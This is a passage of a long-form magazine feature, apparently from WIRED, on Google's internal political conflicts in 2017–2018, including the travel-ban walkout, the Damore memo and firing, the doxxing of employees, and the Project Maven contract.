&lt;p&gt;All of those precepts sent Google's workforce into full tilt after the travel ban was announced. Memegen went flush with images bearing captions like “We stand with you” and “We are you.” Jewglers and HOLA, affinity groups for Jewish and Latinx employees, quickly pledged their support for Google's Muslim group. According to &lt;em&gt;The Wall Street Journal,&lt;/em&gt; members of one mailing list brainstormed whether there might be ways to &lt;a href=&quot;https://www.wsj.com/articles/google-workers-discussed-tweaking-search-function-to-counter-travel-ban-1537488472&quot; target=&quot;_blank&quot;&gt;“leverage” Google's search results&lt;/a&gt; to surface ways of helping immigrants; some proposed that the company should intervene in searches for terms like “Islam,” “Muslim,” or “Iran” that were showing “Islamophobic, algorithmically biased results.” (Google says none of those ideas were taken up.) At around 2 pm that Saturday, an employee on a mailing list for Iranian Googlers floated the possibility of staging a walkout in Mountain View. “I wanted to check first whether anyone thinks this is a bad idea,” the employee wrote. Within 48 hours, a time had been locked down and an internal website set up.&lt;/p&gt;
&lt;p&gt;Employees also spent the weekend protesting as private citizens, out in the open. At San Francisco International Airport, a handful of Google lawyers showed up to offer emergency representation to immigrants; many more staffers joined a demonstration outside the international terminal. But one Googler in particular made national newscasts. On Saturday night, without informing anyone at Google, Sergey Brin showed up at the airport to join the crowds. He offered no other comment to the press except to tell &lt;em&gt;Forbes&lt;/em&gt;, “I'm here because I'm a refugee,” and to make clear that he was there in a personal capacity.&lt;/p&gt;

&lt;/div&gt;
&lt;p&gt;Between pressure from employees and Brin's trip to the airport—which had effectively committed the company to sticking its neck out—Google's own official calculations began to shift. Over the course of the weekend, the company matched $2 million in donations raised by employees for crisis funds for immigrants' rights. And then on Monday, at the last minute, Pichai decided to speak at the employees' demonstration.&lt;/p&gt;

&lt;p&gt;In his short, off-the-cuff remarks to the packed courtyard, Pichai called immigration “core to the founding of this company.” He tried to inject a dose of moderation, stressing how important it was “to reach out and communicate to people from across the country.” But when he mentioned Brin's appearance at the airport, his employees erupted in chants of “Ser-gey! Ser-gey! Ser-gey!” Brin finally extricated himself from the crowd and shuffled up to the mic, windbreaker in hand. He, too, echoed the protesters' concerns but tried to bring the heat down. “We need to be smart,” he said, “and that means bringing in folks who have some different viewpoints.” As he spoke, a news chopper flew overhead.&lt;/p&gt;
&lt;p&gt;And that was pretty much the last time Google's executives and workers presented such a united front about anything.&lt;/p&gt;
&lt;p&gt;As the Trump era wore on, Google continued to brace itself for all manner of external assaults, and not just from the right. The 2016 election and its aftermath set off a backlash against &lt;a href=&quot;https://www.wired.com/category/business/tech-culture/&quot;&gt;Silicon Valley&lt;/a&gt; that seemed to come from all sides. Lawmakers and the media were waking up to the extractive nature of Big Tech's free services. And Google—the company that had casually introduced the internet to consumer &lt;a href=&quot;https://www.wired.com/tag/surveillance/&quot;&gt;surveillance&lt;/a&gt;, orderer of the world's information, owner of eight products with more than a billion users each—knew that it would be an inevitable target.&lt;/p&gt;


&lt;p&gt;But in many respects, Google's most vexing threats during that period came from inside the company itself. Over the next two and a half years, the company would find itself in the same position over and over again: a nearly $800 billion planetary force seemingly powerless against groups of employees—on the left and the right alike—who could hold the company hostage to its own public image.&lt;/p&gt;
&lt;p&gt;In a larger sense, Google found itself and its culture deeply maladapted to a new set of political, social, and business imperatives. To invent products like Gmail, Earth, and Translate, you need coddled geniuses free to let their minds run wild. But to lock down lucrative government contracts or expand into coveted foreign markets, as Google increasingly needed to do, you need to be able to issue orders and give clients what they want.&lt;/p&gt;
&lt;p&gt;For this article, WIRED spoke with 47 current and former Google employees. Most of them requested anonymity. Together, they described a period of growing distrust and disillusionment inside Google that echoed the fury roaring outside the company's walls. And in all that time, Google could never quite anticipate the right incoming collision. After the travel ban walkout, for example, the company's leaders expected the worst—and that it would come from Washington. “I knew we were snowballing toward something,” a former executive says. “I thought it was going to be Trump calling us out in the press. I didn't think it was gonna be some guy writing a memo.”&lt;/p&gt;

&lt;p&gt;&lt;cite class=&quot;caption-component__credit&quot;&gt;Jason Henry/The New York Times&lt;/cite&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;h3&gt;II.&lt;/h3&gt;
&lt;/section&gt;&lt;section class=&quot;section-break-component&quot; readability=&quot;294.99139256071&quot;&gt;&lt;p&gt;&lt;span class=&quot;lede&quot;&gt;In a lot&lt;/span&gt; of ways, Google's internal social networks are like a microcosm of the internet itself. They have their &lt;a href=&quot;https://www.wired.com/story/study-revives-debate-about-googles-filter-bubbles/&quot;&gt;filter bubbles&lt;/a&gt;, their trolls, their edgelords. And contrary to popular perception, those networks are not all populated by liberals. Just as the reactionary right was rising on YouTube, it was also finding ways to amplify itself inside Google's rationalist culture of debate.&lt;/p&gt;
&lt;p&gt;For some time, for instance, one of the moderators of the company's Conservatives email list was a Chrome engineer named Kevin Cernekee. Over the years, Google employees have described Cernekee fairly consistently: as a shrewd far-right provocateur who made his presence felt across Google's social network, trolling both liberals and conservatives.&lt;/p&gt;
&lt;p&gt;In August 2015, the giant IndustryInfo mailing list broke into a roiling debate over why there were so few women in tech. The previous year, Google had become the first Silicon Valley giant to release data on the demographics of its workforce—and revealed that 82 percent of its technical workers were male. To many inside the IndustryInfo thread, the number constituted clear and galling evidence that Google had to change. When the conversation devolved into a brawl over the merits of diversity—one that Cernekee joined—a senior vice president at Google attempted to shut it down. Cernekee proceeded to bombard the executive's Google+ page with posts about his right to critique the pro-diversity “Social Justice political agenda.” “Can we add a clear statement of banned opinions to the employee handbook,” he wrote, “so that everybody knows what the ground rules are?” In response, Google HR issued Cernekee a written warning for “disrespectful, disruptive, disorderly, and insubordinate” comments.&lt;/p&gt;
&lt;p&gt;Google also took action against employees on the opposite side of the debate for their conduct in the same thread; but disciplining Cernekee had more lasting consequences. In November 2015, Cernekee filed a charge with the National Labor Relations Board claiming that Google's warning constituted retaliation for his political views. He also alleged that the reprimand interfered with his right to engage in “protected concerted activity”—essentially, his right to freely discuss workplace conditions—as defined under the National Labor Relations Act.&lt;/p&gt;


&lt;p&gt;As Cernekee entered into a years-long legal battle with Google, he stayed active on internal channels. In 2016, when members of a white nationalist group called the Golden State Skinheads clashed with antifa counterprotesters in a Sacramento park, Cernekee spoke up for the former on Google's Free Speech mailing list. Though he said he was “the farthest thing possible from a Nazi,” Cernekee argued that the skinheads “stood up for free speech and free association.” And in January 2017, when the prominent white nationalist Richard Spencer was punched in the head by a masked protester after Trump's inauguration, Cernekee told his fellow list members that “the battle over free speech is escalating.” He asked them to donate to a WeSearchr campaign that was raising a bounty for anyone who could track down the identity of the assailant. When mailing list members said that WeSearchr—a far-right answer to GoFundMe founded by the agitators Charles C. Johnson and Pax Dickinson—seemed shady, Cernekee wrote, “It is completely on the up-and-up. Please don't slander my friends. :-(.”&lt;/p&gt;
&lt;p&gt;But as conspicuous as Cernekee was inside Google, he was all but invisible on the open internet. Consequently, it wasn't Cernekee who would become Google's most famous heretic. That distinction would fall to a comparatively reticent Google Search engineer named James Damore.&lt;/p&gt;
&lt;p&gt;In late June 2017, Damore attended a company event about promoting diversity at Google, hosted at the Mountain View headquarters. There, he claims, he heard organizers discuss providing extra job interviews and more welcoming environments for women and underrepresented minorities. (Google says it does not provide additional interviews for people belonging to specific demographics.) To Damore, this all sounded like a violation of Google's meritocratic hiring process, a finely tuned system built to identify objectively qualified engineers.&lt;/p&gt;
&lt;p&gt;Soon after, on the plane ride back from a work trip to China, Damore wrote a &lt;a href=&quot;https://www.wired.com/story/the-pernicious-science-of-james-damores-google-memo/&quot;&gt;10-page memo&lt;/a&gt; arguing that biological differences could help explain why there were fewer female engineers at Google, and therefore the company's attempts to reach gender parity were misguided and discriminatory toward men. On average, he wrote, women are more interested in people than things, more empathetic, more neurotic, and less assertive. To support these claims about personality differences, Damore cited two studies, three Wikipedia pages, and an article from Quillette, a contrarian online magazine that often covers free speech on campus and alleged links between genetics and IQ. In the memo, Damore wrote that hiring practices aimed to increase diversity “can effectively lower the bar” at Google.&lt;/p&gt;
&lt;p&gt;All through July, Damore tried to get Google's management to pay attention to his concerns. He sent his memo to the diversity summit's organizers; he sent it to Google's human resources department; at the suggestion of a coworker, he posted it in Coffee Beans, the internal listserv for discussions about diversity. He made the same points in person at one of Google's “Bias Busting” workshops, where employees role-play how to identify unconscious bias against minorities. (There, he later claimed, his coworkers laughed at him.)&lt;/p&gt;

&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;p&gt;Damore framed his memo as an appeal for intellectual diversity, identifying his reasoning as a conservative political position silenced by Google's “ideological echo chamber.” “It's a perspective that desperately needs to be told at Google,” Damore wrote.&lt;/p&gt;
&lt;p&gt;Plenty of Damore's colleagues, however, had heard this perspective before. Ad nauseam. “People would write stuff like that every month,” says one former Google executive. When the subject of diversifying Google's workforce comes up in big meetings and internal forums, one black female employee says, “you pretty much need to wait about 10 seconds before someone jumps in and says we're lowering the bar.” (After one diversity town hall in April 2015, an employee wrote in an internal Google+ post that Google was “lowering the hiring bar for minorities, or arranging events where white men feel excluded.”) What's more, the debate kept coming up in a repetitive loop because of the constant influx of young graduates who were engaging in these discussions for the first time. Google was hiring at a breakneck pace at the time. Between 2015 and 2017, it added some 20,000 full-time employees, about the same number as Facebook's entire workforce. (And even after all that hiring, Google's technical workforce was 80 percent male, 56 percent white, and 41 percent Asian.)&lt;/p&gt;
&lt;p&gt;Damore's memo might have faded into obscurity if a colleague hadn't suggested that he share it with some more receptive audiences inside Google. On Wednesday, August 2, Damore posted his memo to an internal mailing list called Skeptics. The next day he shared it with Liberty, an internal list for libertarians—one Damore hadn't known existed. By Friday, the tech blog &lt;a href=&quot;https://www.vice.com/en_us/article/59nmkx/google-employee-alleges-discrimination-against-pregnant-women-in-viral-memo&quot; target=&quot;_blank&quot;&gt;Motherboard&lt;/a&gt; was reporting that an “anti-diversity manifesto” had gone viral inside Google.&lt;/p&gt;
&lt;p&gt;Pichai was on vacation when his deputies told him that Google had better deal with the Damore situation quickly. Pichai agreed and asked to corral his full management team for a meeting. By Saturday, a full copy of Damore's document had leaked to &lt;a href=&quot;https://gizmodo.com/exclusive-heres-the-full-10-page-anti-diversity-screed-1797564320&quot; target=&quot;_blank&quot;&gt;Gizmodo&lt;/a&gt;. While Googlers waited for an official response from the top, managers who wanted to signal their support for women loudly condemned the memo's ideas on internal Google+ posts.&lt;/p&gt;


&lt;p&gt;To Liz Fong-Jones, a site reliability engineer at Google, the memo's arguments were especially familiar. Google's engineers are not unionized, but inside Google, Fong-Jones essentially performed the function of a union rep, translating employee concerns to managers on everything from product decisions to inclusion practices. She had acquired this informal role around the time the company released Google+ to the public in 2011; before launch, she warned executives against requiring people to use their real names on the platform, arguing that anonymity was important for vulnerable groups. When public uproar played out much as Fong-Jones had predicted, she sat across from executives to negotiate a new policy—then explained the necessary compromises to irate employees. After that, managers and employees started coming to her to mediate internal tensions of all sorts.&lt;/p&gt;
&lt;p&gt;As part of this internal advocacy work, Fong-Jones had become attuned to the way discussions about diversity on internal forums were beset by men like Cernekee, Damore, and other coworkers who were “just asking questions.” To her mind, Google's management had allowed these dynamics to fester for too long, and now it was time for executives to take a stand. In an internal Google+ post, she wrote that “the only way to deal with all the heads of the medusa is to no-platform all of them.”&lt;/p&gt;
&lt;p&gt;A few hours later, Google's internal networks received a shock to the system. A screenshot of Fong-Jones' “Medusa” comment appeared on Vox Popoli, a blog run by the alt-right instigator Theodore Beale, along with her full name and profile photo. The comments section quickly filled with racial and sexual slurs fixated personally on Fong-Jones, who is trans. “They should pitch all those sexual freaks off of rooftops,” one anonymous Vox Popoli commenter wrote.&lt;/p&gt;

&lt;p&gt;On Monday morning, Google's top management finally met to discuss what to do about Damore. The room, according to reporting by &lt;a href=&quot;https://www.vox.com/2017/8/10/16125452/google-sundar-pichai-fire-james-damore-diversity-memo&quot; target=&quot;_blank&quot;&gt;Recode&lt;/a&gt;, was split. Half the executives believed Damore shouldn't be fired. Then YouTube CEO Susan Wojcicki and head of communications Jessica Powell urged their colleagues to consider how they would have reacted if Damore had applied the same arguments to race, rather than gender. That persuaded them: The engineer had to go. In a note to employees, Pichai said he was firing Damore for perpetuating gender stereotypes.&lt;/p&gt;
&lt;p&gt;In his message, Pichai tried to assure the left without alienating the right. “To suggest a group of our colleagues have traits that make them less biologically suited to that work is offensive and not OK,” he wrote. “At the same time, there are co-workers who are questioning whether they can safely express their views in the workplace (especially those with a minority viewpoint). They too feel under threat, and that is also not OK. People must feel free to express dissent.” Then he promised to fly back to the Bay Area for a TGIF meeting on Thursday where the employees could discuss the matter.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.wired.com/story/ex-google-employee-claims-wrongful-firing-for-criticizing-james-damores-memo/&quot;&gt;Damore's termination&lt;/a&gt; set off a predictable onslaught of negative coverage from the right. Tucker Carlson, Ann Coulter, and Ben Shapiro all bashed Google; &lt;em&gt;New York Times&lt;/em&gt; columnist David Brooks called for Pichai to resign. Damore gave his first interviews to YouTubers Jordan Peterson and Stefan Molyneux, the latter of whom is a proponent of “race realism.” The alt-right took this as an endorsement and started churning out memes of Damore, his head on Martin Luther's body, nailing his memo to the door of a church.&lt;/p&gt;

&lt;p&gt;More leaks from inside Google fed the frenzy. Screenshots of conversations among Google employees on internal social networks, some dating back to 2015, appeared on Breitbart. Meanwhile, on a pro-Trump subreddit, a collage appeared that showed the full names, profile pictures, and Twitter bios of eight Google employees, most of them queer, transgender, or people of color. Fong-Jones was one of them. Each bio featured phrases that would make the employees instant targets for online harassment: “polyamorous queer autistic trans lesbian,” “just another gay communist site reliability engineer,” or, in Fong-Jones' case, “Trans and queer as fuck.” Two days after Damore was fired, Milo Yiannopoulos, the former tech editor at Breitbart, shared the Reddit collage image with 2 million Facebook followers. “Look at who works for Google, it all makes sense now,” he wrote—as if these eight employees had been the ones who made the decision to ax Damore.&lt;/p&gt;

&lt;p&gt;For the employees who were being targeted, the leaks were terrifying. How many of their coworkers were feeding material to the alt-right? How many more leaks were coming? And what was their employer going to do to protect them?&lt;/p&gt;
&lt;p&gt;In the past Google had fired an employee for leaking internal memes from Memegen. But when the targeted employees reported harassment, they say, Google's security team told them that the leaking of screenshots might fall under the legal definition of “protected concerted activity”—the same labor right invoked by Cernekee.&lt;/p&gt;
&lt;p&gt;To Fong-Jones, the security team's answer was both shocking and instructive; she didn't realize a leaker could be protected. “Everyone thought Google had an absolute right to stop you from talking about anything related to Google,” she says. Yet here Google's hands were apparently tied by labor law.&lt;/p&gt;


&lt;p&gt;Executives felt that they were doing everything they could. They offered to put up employees who had been doxed in a hotel for the night. But to the targeted employees, it felt as though Google was allowing fear of a far-right backlash and the threat of further lawsuits to trump the safety concerns of loyal employees. (A spokesperson for Google declined to specify whether the company managed to uncover the identity of the leakers in this case but said it investigates all such incidents and enforces its policies without regard to politics.)&lt;/p&gt;
&lt;p&gt;By the day when Pichai was supposed to answer questions about Damore at TGIF, chaos surrounded Google. That afternoon, Damore returned to campus with a photographer whom &lt;em&gt;The New York Times&lt;/em&gt; had recently dubbed “the Annie Leibovitz of the alt-right.” “Live in Mountain View,” the engineer tweeted, teasing some impending spectacle to his 40,000 new Twitter fans. Punchy tech reporters, sensing an opening, solicited employees to send them a live readout from the town hall.&lt;/p&gt;
&lt;p&gt;Forty-five minutes before the meeting was supposed to start, Pichai sent his 78,000 employees an email. “TL;DR Sorry for the late notice, but we are going to cancel today's Town Hall,” he wrote. “We had hoped to have a frank, open discussion today as we always do to bring us together and move forward.” But the questions employees had submitted for discussion at the meeting, he wrote, had been leaked to the press and were already appearing in &lt;a href=&quot;https://www.wired.com/story/googles-ceo-must-answer-these-questions-about-that-memo/&quot;&gt;outlets like WIRED&lt;/a&gt;. He also alluded, vaguely, to the employees who had been doxed as part of his rationale for canceling the meeting. “On some websites Googlers are now being named personally,” Pichai wrote.&lt;/p&gt;
&lt;p&gt;Fong-Jones was at home in Brooklyn when she received Pichai's email. She had wanted the executives to explain why, given their reasons for firing Damore, they had let his memo float around Google for more than a month. Now it felt as if Google was using the abuse she and other employees had experienced as an excuse to not answer questions. “That 100 percent did not sit right with me,” she says. “That wasn't going to make me any safer. In fact, it was a triumph, almost, for the people harassing me.”&lt;/p&gt;

&lt;p&gt;In her internal advocacy work, Fong-Jones had always been happy to meet senior managers on their terms. She kept their secrets. She followed the rules. And she instructed others to do the same. Executives talked to people they trusted, and they didn't trust people who talked to outsiders. But now Fong-Jones decided to take matters into her own hands. In October she invited a labor group that normally organizes blue-collar workers to teach Googlers more about protected concerted activity. Perhaps a knowledge of labor law would come in handy.&lt;/p&gt;
&lt;h3&gt;III.&lt;/h3&gt;
&lt;/section&gt;&lt;section class=&quot;section-break-component&quot; readability=&quot;181.9349112426&quot;&gt;&lt;p&gt;&lt;span class=&quot;lede&quot;&gt;In the beginning,&lt;/span&gt; Google gave its employees freedom because doing so paid off. Some of the company's first multibillion-dollar wins came from granting engineers autonomy and stoking their ambitions. In 2002 five engineers coding through the weekend came up with the core insight behind AdWords, the source of much of the company's revenue. The engineers weren't on the ads team and hadn't been asked to work on the problem. But they saw a note Larry Page had left in the office kitchen on a Friday afternoon saying “THESE ADS SUCK.” By 5 am Monday the engineers had sent out a link with a prototype of their proposed solution.&lt;/p&gt;
&lt;p&gt;That breakthrough set the stage for what seemed like a virtuous cycle. Because Google made its money by showing people ads, it had a vested interest in growing the internet itself, and in finding new ways to make it useful. Free, world-changing products poured out: Search, Gmail, Chrome, Maps, Docs, Photos, Translate. To the lucky beneficiaries—the company's billions of users—it was almost as if Google were a public works department and not a capitalist enterprise at all. The best engineers on earth flocked to enlist, and the company offered them time to spend on their own larks. Google saw office perks, employee freedom, and lofty missions as a proven recipe for staying ahead in a changing world.&lt;/p&gt;
&lt;p&gt;Over time, Google's leaders codified this radical culture and evangelized it to the outside world, as if Google had found a way to suspend the ordinary laws of management and commerce. In their best-selling 2014 book, &lt;em&gt;&lt;a href=&quot;https://www.amazon.com/How-Google-Works-Eric-Schmidt/dp/1455582328?tag=w050b-20&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;How Google Works&lt;/a&gt;,&lt;/em&gt; Schmidt and Jonathan Rosenberg, two of the main architects of Google's culture, stressed the importance of open debate in the care and feeding of innovative people. “In our experience, most smart creatives have strong opinions and are itching to spout off; for them, the cultural obligation to dissent gives them the freedom to do just that,” they wrote. They stressed the importance of rooting out “knaves” (liars, cheaters, loafers) but supporting and protecting “divas,” difficult but brilliant employees who can grate on other employees' nerves. “You need these aberrant geniuses because they're the ones that drive, in most cases, the product excellence,” Schmidt said in an interview with WIRED earlier this year. “They are better than other technical people.”&lt;/p&gt;
&lt;p&gt;One of Google's paradigmatic divas was Andy Rubin, the cofounder of Android, a startup that Google acquired in 2005 for an estimated $50 million. Rubin was known for being territorial, demanding, and impressively inventive. Journalists rarely failed to mention his penchant for oddball devices, including a doorbell at his home with a robotic arm that rang a gong on the interior, and a retinal scanner on the exterior. (“The system makes it easier to deal with former girlfriends,” reported a 2007 &lt;em&gt;New York Times&lt;/em&gt; profile, paraphrasing Rubin. “No messy scenes retrieving keys—it's just a simple database update.”)&lt;/p&gt;
&lt;p&gt;As executives saw it, Rubin delivered handsomely for Google. More than anyone else, he ensured the company's safe and profitable transition into the mobile era. As users moved from desktops to smartphones, Android's open source operating system acted as a Trojan horse for Google's consumer apps, most importantly search. By 2013, Android had a billion users, and its success afforded Rubin unbelievable perks, including a $14 million loan with a 1 percent interest rate to buy a beach house in Japan. Page was particularly grateful. At one point he awarded Rubin a $150 million stock grant, before Google's compensation committee even approved the offer.&lt;/p&gt;
&lt;p&gt;Google didn't invent all the concepts that charged its culture. (“Obligation to dissent,” for example, is borrowed from the management consulting firm McKinsey.) But it tied them together into a coherent, aspirational narrative about engineers as a free-thinking people uniquely capable of reconfiguring the world from first principles. This culture helped recruiting, it helped retention, and it kept the public and regulators rapt with admiration. So what if Google was becoming inordinately powerful? The monopolies of the past engaged in price-gouging and became less inventive. Google's products stayed free and continued to blow your mind.&lt;/p&gt;

&lt;p&gt;Google's culture helped recruiting, it helped retention, and it kept the public and regulators rapt with admiration.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;p&gt;Occasionally, of course, a glitch would mar Google's image as a benign, gravity-defying force in world markets, but even those glitches would sometimes resolve in ways that reinforced the myth. In 2006, eager to tap into a growing market, Google opened an office in Beijing and launched a &lt;a href=&quot;https://www.wired.com/story/google-might-be-ready-to-play-by-chinas-censorship-rules/&quot;&gt;censored version of its search engine&lt;/a&gt; in China. Employees saw this as a clear violation of Google's principles; they were supposed to make the world's information universally accessible, not suppress it. The project quickly went awry. Executives had hoped that Google's presence in China would make the country more open, not closed. Instead, it emboldened the government to demand more concessions. Then, in December 2009, Google discovered a sophisticated cyberattack, originating inside China, designed to access the Gmail accounts of dissidents and human rights activists. Brin, who had been extremely reluctant to enter China all along, convinced Page that they should stop complying with China's censorship rules and tell the public about the attack.&lt;/p&gt;
&lt;p&gt;At the time, Google was run as a triumvirate, with CEO Eric Schmidt playing the role of resident grown-up. Schmidt argued that if Google stopped censoring search results, it would never get back into China. But Page and Brin were unmoved. In January 2010, employees at Google's office in Beijing learned from a public blog post that the company was pulling back from China. In an emotional teleconference, they told executives they felt abandoned.&lt;/p&gt;
&lt;p&gt;The reaction in Mountain View, however, was euphoric. At the TGIF meeting that week, employees burst into thunderous applause and gave Brin a standing ovation. “The legacy of the China decision was a giant dose of goodwill from Googlers around the world,” Schmidt wrote in &lt;em&gt;How Google Works&lt;/em&gt;; it reaffirmed the company's principles “governing how all tough decisions should be made.”&lt;/p&gt;
&lt;p&gt;Within five years, however, the costs of that decision—and the limits of Google's entire formula for success—were starting to become uncomfortably clear. Google was still minting money, but ad revenue growth was slowing, and the cost of hiring engineers and funding R&amp;amp;D was climbing fast. Investors wanted to know what was next, and Google didn't have a convincing answer. The company was making incredible strides in &lt;a href=&quot;https://www.wired.com/category/business/artificial-intelligence/&quot;&gt;artificial intelligence&lt;/a&gt;, but its growth online was increasingly boxed in by social networking sites. For users hanging out inside Facebook or talking to Alexa, Google's apps were no longer a click away. And while the company's founders tinkered with &lt;a href=&quot;https://www.wired.com/story/waymo-self-driving-cars-california/&quot;&gt;self-driving cars&lt;/a&gt; and &lt;a href=&quot;https://www.wired.com/story/how-loons-balloons-find-way-deliver-internet/&quot;&gt;helium balloons that beamed the internet&lt;/a&gt; down to earth, Amazon had built up a huge advantage in an area that should have been Google's to lose: cloud computing.&lt;/p&gt;


&lt;p&gt;Page and Brin had been focused on the cloud for more than a decade. They had built a sublime constellation of data centers around the world to power Google's own products like Gmail, a service that, for vast swaths of users, had normalized the idea of surrendering your data to a company's remote servers. But Google's MO was building products that a billion people would use by default—not closing deals, managing contracts, and customizing infrastructure for other companies.&lt;/p&gt;
&lt;p&gt;Amazon had no such compunctions. In 2006 it began marketing a simple but highly effective cloud computing platform to other firms, ultimately offering clients like NASA and Netflix on-demand access to computing power, including storing and processing data. By the time Google finally offered a comparable service called Google Cloud Platform, in 2012, Amazon was already leagues ahead. In April 2015, Bezos revealed that Amazon Web Services had brought in $4.6 billion in revenue the previous year and was on track to out-earn his retail business soon. Google's earnings call was the same day. The company reported that 90 percent of its revenue was still from online advertising.&lt;/p&gt;
&lt;p&gt;Around the same time, Google's decision to take the moral high road out of China was seeming more and more like a self-isolating move. Across Silicon Valley, tech giants in search of growth were going after China's then-680 million internet users. Apple had been running an app store in China since 2010. Microsoft's search engine, Bing, had served censored search results since 2009. Even LinkedIn was there. Meanwhile, Google watched as Chinese handset manufacturers like Xiaomi sold phones that ran on an unofficial version of Android—which meant no Google Search on the homescreen, no Google app store, and no good way to make money off of millions of devices.&lt;/p&gt;
&lt;p&gt;The problem wasn't just that Google was losing a slice of revenue here or there. For Google, these weaknesses in cloud computing and China triggered an existential dread: They meant the company was losing visibility into the way the internet was evolving and what the future would look like.&lt;/p&gt;
&lt;p&gt;In 2015, Google embarked on a massive reorganization. Under a new parent company, Alphabet, moon shots and side projects would fall outside of Google, which would be more focused on making money. With Pichai as Google's new CEO, finding a new footing in China and cloud computing were among the company's priorities. One of Pichai's first moves, for instance, was to hire &lt;a href=&quot;https://www.wired.com/2016/03/tech-exec-wants-cloud-googles-moneymaker/&quot;&gt;Diane Greene&lt;/a&gt;, a cofounder of VMware, a company that helped popularize an early version of cloud computing before the dotcom bust. Greene would head Google's cloud division. But catching up with Bezos was going to require Google to reorient. Buyers wanted dependability, not wizardry—and they wanted someone in Mountain View to pick up the phone. And to make up for lost time, Greene would need to go after some big clients.&lt;/p&gt;

&lt;/section&gt;&lt;section class=&quot;section-break-component&quot; readability=&quot;58.322685300724&quot;&gt;&lt;p&gt;&lt;span class=&quot;lede&quot;&gt;On August 11,&lt;/span&gt; 2017—the day after pandemonium at the Googleplex had prompted Pichai to cancel the town hall to discuss Damore—Google's executives entertained an unlikely visitor: &lt;a href=&quot;https://www.wired.com/story/james-mattis-artificial-intelligence-diux/&quot;&gt;secretary of defense James Mattis&lt;/a&gt;. At headquarters, they met the retired general across a stately conference table, with Brin, Pichai, Greene, and Walker on one side and Mattis' crew on the other, all situated in the latest-model Aeron chairs in a new shade called “Mineral.”&lt;/p&gt;
&lt;p&gt;Mattis was there to talk business. The Pentagon was in the process of rekindling its relationship with Silicon Valley, which had grown up out of military contract work in the 1950s and '60s. The rise of artificial intelligence made a potential relationship once again seem mutually beneficial. In recent years, partly at the urging of tech executives like Schmidt, the Pentagon had begun pursuing contracts to modernize its digital infrastructure. But before the Pentagon could fully partake in AI and machine learning, the department had to label its stockpiles of data and move it to the cloud.&lt;/p&gt;
&lt;p&gt;At the time of Mattis' visit, Google was reportedly in the process of bidding for a project that would jump-start this transition. It was called the Algorithmic Warfare Cross-Functional Team, otherwise known as &lt;a href=&quot;https://www.wired.com/story/google-sets-limits-on-its-use-of-ai-but-allows-defense-work/&quot;&gt;Project Maven&lt;/a&gt;. The project would involve labeling past drone footage to train a computer vision algorithm so that, once everything was in the cloud, new drone footage could be analyzed automatically. Though it was a relatively small contract, Maven represented an important potential prize for Google. Greene had recently boasted that Google Cloud, which according to analysts had 5 percent market share at the time, could be bigger than Amazon by 2022. Federal contracts offered a quick way to get there. Maven could put Google on the fast track to receive the security clearances it needed to win more lucrative defense and intelligence agency contracts, like Joint Enterprise Defense Infrastructure (JEDI), a massive Pentagon cloud contract that was worth some $10 billion—if any cunning competitor could wrestle it away from Bezos.&lt;/p&gt;
&lt;p&gt;Google, Amazon, and IBM were all in the running for the Maven contract. But Google was an especially furtive competitor. The company quietly put in a bid via a contractor, and it prohibited the Pentagon from mentioning Google without prior approval. As Google seemed to close in on winning the contract, executives from the cloud team pondered how a deal with the Pentagon—especially one that could be linked to autonomous weapons—might reflect on Google's non-evil brand. In September, a few weeks after the meeting with Mattis, they discussed spinning up some positive PR that would focus on the “vanilla cloud technology” aspects of the Maven contract. “Avoid at ALL COSTS any mention or implication of AI,” wrote Fei-Fei Li, a Stanford professor and Google Cloud's chief scientist for AI. Li had not been involved in the Maven contract, but she was concerned about the hype and confusion building around AI in the public imagination. “Weaponized AI is probably one of the most sensitized topics of AI—if not THE most. This is red meat to the media to find all ways to damage Google.”&lt;/p&gt;
&lt;p&gt;Li was right to be concerned about how Maven might be received, but the media was not the only group she had to worry about. When Google won the Maven contract in late September, the company opted not to say anything at all—even to its own employees. But it wasn't long before Liz Fong-Jones learned about Maven from a group of concerned engineers who had been tapped to lay some of the groundwork for it. They asked her to keep quiet until January while they tried to convince management to change course. Fong-Jones agreed and focused her attention on another fire that was quietly burning inside Google.&lt;/p&gt;

&lt;p&gt;James Damore appears alongside attorney Harmeet Dhillon during a press conference on January 8, 2018, in San Francisco, announcing a lawsuit against Google.&lt;/p&gt;

&lt;p&gt;“You won't want to miss it,” the email promised.&lt;/p&gt;
&lt;p&gt;Damore sat next to Dhillon as she told a smattering of tech reporters and local news affiliates that her client had filed a class-action lawsuit against Google, alleging discrimination against white people, Asians, men, and conservatives, or any combination thereof. “We don't normally file 100-page, 200-page complaints,” Dhillon explained, thumbing through a heavy printout of the complaint laid out in front of her. “I didn't think people were going to believe the outlandish nonsense, so we actually attached screenshots throughout.”&lt;/p&gt;
&lt;p&gt;When Damore had filed a set of documents stating an intent to sue Google in December 2017, the documents named Kevin Cernekee as a fellow plaintiff, but that complaint never materialized. In the lawsuit unveiled by Dhillon that day, Cernekee's name made no appearance. The complaint quoted from Google's warning letter to him and included details about his interactions with executives and HR as evidence that Google had discriminated against conservatives, but Cernekee's identity remained mostly invisible to the outside world. At least 169 other Google employees were not so lucky: The screenshots included in the lawsuit revealed dozens of email addresses, profile pictures, and snippets of discussion. Most had been culled from Google's internal social networks, including an anonymous message board about mental health and a mailing list for gender-nonbinary employees.&lt;/p&gt;


&lt;p&gt;Another round of harassment quickly began. Threats poured in, calling for employees critical of Damore to be shot in the head, poisoned, blown up, stalked, doxed, sodomized with a cattle prod, and thrown off a building. As before, many of the employees who got singled out were queer and trans people of color. On forums like 4chan, employee names exposed in the lawsuit were linked to their social media accounts. The personal information of at least three employees was dug up and posted online. Another employee was the subject of a derogatory thread on an online forum called Kiwi Farms, which &lt;em&gt;New York&lt;/em&gt; magazine has called the web's biggest stalker community.&lt;/p&gt;
